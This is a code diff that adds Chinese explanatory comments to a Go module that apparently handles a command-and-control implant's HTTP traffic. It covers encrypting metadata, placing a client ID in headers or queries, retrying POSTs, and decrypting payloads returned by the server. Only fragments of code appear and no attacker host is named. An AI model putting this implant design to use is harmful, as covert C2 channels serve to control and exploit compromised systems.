@@ -18,6 +18,8 @@ var (
 )
 
 // init was called at beginning of the package
+// init函数: 这是一个特殊的函数，它在Go框架加载包时自动执行。
+// 它设置了HTTP请求的一些关键参数，如超时、代理URL、主机名，并使用这些参数配置HTTP请求客户端。
 func init() {
 	if !config.IsDNS {
 		httpRequest.SetTimeout(config.TimeOut)
@@ -42,6 +44,8 @@ func init() {
 
 // HttpPost seems post response is no need to deal with
 // need to handler c2profile here
+// HttpPost函数: 这个函数主要用于发送HTTP POST请求。它首先对输入的数据进行加密，
+// 然后根据配置将客户ID添加到查询参数或HTTP头部。再根据预置和后置的配置添加数据。最后，它反复发送HTTP请求，直到成功为止。
 func HttpPost(data []byte) *req.Resp {
 	data = util.EncryptField(config.PostClientDataEncryptType, data)
 
@@ -83,6 +87,8 @@ func HttpPost(data []byte) *req.Resp {
 }
 
 // HttpGet need to handler c2profile here, data is raw rsa encrypted meta info
+// HttpGet函数: 这个函数用于发送HTTP GET请求。它首先将输入数据加密并添加到查询参数或HTTP头部，
+// 然后发送请求。如果服务器返回了200状态码，它将处理服务器响应并返回有效载荷；否则，它将返回一个错误。
 func HttpGet(data []byte) ([]byte, error) {
 	buf := bytes.NewBuffer(data)
 	stringData := string(util.EncryptField(config.GetMetaEncryptType, buf.Bytes()))
@@ -119,6 +125,8 @@ func HttpGet(data []byte) ([]byte, error) {
 }
 
 // extract payload
+// resolveServerResponse函数: 这个函数根据请求的方法解析服务器响应。对于GET和POST请求，
+// 它先去除前后的特定字符串，然后解密响应数据。如果请求方法既不是GET也不是POST，它将抛出一个异常。
 func resolveServerResponse(res *req.Resp) ([]byte, error) {
 	method := res.Request().Method
 	// response body string
